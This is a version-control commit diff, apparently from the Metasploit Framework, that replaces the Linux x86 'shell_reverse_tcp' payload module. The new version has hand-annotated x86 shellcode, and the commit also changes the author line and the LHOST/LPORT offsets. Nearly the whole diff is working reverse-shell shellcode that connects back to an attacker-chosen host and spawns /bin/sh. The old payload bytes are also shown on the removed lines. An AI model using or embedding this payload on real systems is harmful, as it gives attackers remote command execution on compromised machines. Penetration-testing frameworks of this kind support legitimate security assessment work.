eb0c6d1a65d71328e1b801d002e07713fe66d35c
Ramon de C Valle <rcvalle@live.com>
2008-10-23 02:19:50 +0000

    Added missing Linux x86 payload modules from unixasm
    git-svn-id: file:///home/svn/framework3/trunk@5782 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/payloads/singles/linux/x86/shell_reverse_tcp.rb
+++ modules/payloads/singles/linux/x86/shell_reverse_tcp.rb
@@ -19,13 +19,13 @@ module Metasploit3
 
 	include Msf::Payload::Single
 	include Msf::Payload::Linux
-	
+
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
 			'Version'       => '$Revision$',
 			'Description'   => 'Connect back to attacker and spawn a command shell',
-			'Author'        => 'skape',
+			'Author'        => 'Ramon de Carvalho Valle <ramon@risesecurity.org>',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'linux',
 			'Arch'          => ARCH_X86,
@@ -35,15 +35,47 @@ module Metasploit3
 				{
 					'Offsets' =>
 						{
-							'LHOST'    => [ 0x1a, 'ADDR' ],
-							'LPORT'    => [ 0x20, 'n'    ],
+							'LHOST'    => [ 18, 'ADDR' ],
+							'LPORT'    => [ 24, 'n'    ],
 						},
 					'Payload' =>
-						"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59" +
-						"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x7f\x00\x00\x01\x66\x68" +
-						"\xbf\xbf\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd" +
-						"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +
-						"\x89\xe1\xb0\x0b\xcd\x80"
+						"\x31\xdb"             +#   xorl    %ebx,%ebx                  #
+						"\xf7\xe3"             +#   mull    %ebx                       #
+						"\x53"                 +#   pushl   %ebx                       #
+						"\x43"                 +#   incl    %ebx                       #
+						"\x53"                 +#   pushl   %ebx                       #
+						"\x6a\x02"             +#   pushl   $0x02                      #
+						"\x89\xe1"             +#   movl    %esp,%ecx                  #
+						"\xb0\x66"             +#   movb    $0x66,%al                  #
+						"\xcd\x80"             +#   int     $0x80                      #
+						"\x5b"                 +#   popl    %ebx                       #
+						"\x5e"                 +#   popl    %esi                       #
+						"\x68\x7f\x00\x00\x01" +#   pushl   $0x0100007f                #
+						"\x66\x68\x04\xd2"     +#   pushw   $0xd204                    #
+						"\x66\x53"             +#   pushw   %bx                        #
+						"\x6a\x10"             +#   pushl   $0x10                      #
+						"\x51"                 +#   pushl   %ecx                       #
+						"\x50"                 +#   pushl   %eax                       #
+						"\x89\xe1"             +#   movl    %esp,%ecx                  #
+						"\x43"                 +#   incl    %ebx                       #
+						"\x6a\x66"             +#   pushl   $0x66                      #
+						"\x58"                 +#   popl    %eax                       #
+						"\xcd\x80"             +#   int     $0x80                      #
+						"\x59"                 +#   popl    %ecx                       #
+						"\x87\xd9"             +#   xchgl   %ebx,%ecx                  #
+						"\xb0\x3f"             +#   movb    $0x3f,%al                  #
+						"\xcd\x80"             +#   int     $0x80                      #
+						"\x49"                 +#   decl    %ecx                       #
+						"\x79\xf9"             +#   jns     <cntsockcode+43>           #
+						"\x50"                 +#   pushl   %eax                       #
+						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
+						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
+						"\x89\xe3"             +#   movl    %esp,%ebx                  #
+						"\x50"                 +#   pushl   %eax                       #
+						"\x53"                 +#   pushl   %ebx                       #
+						"\x89\xe1"             +#   movl    %esp,%ecx                  #
+						"\xb0\x0b"             +#   movb    $0x0b,%al                  #
+						"\xcd\x80"              #   int     $0x80                      #
 				}
 			))
 	end
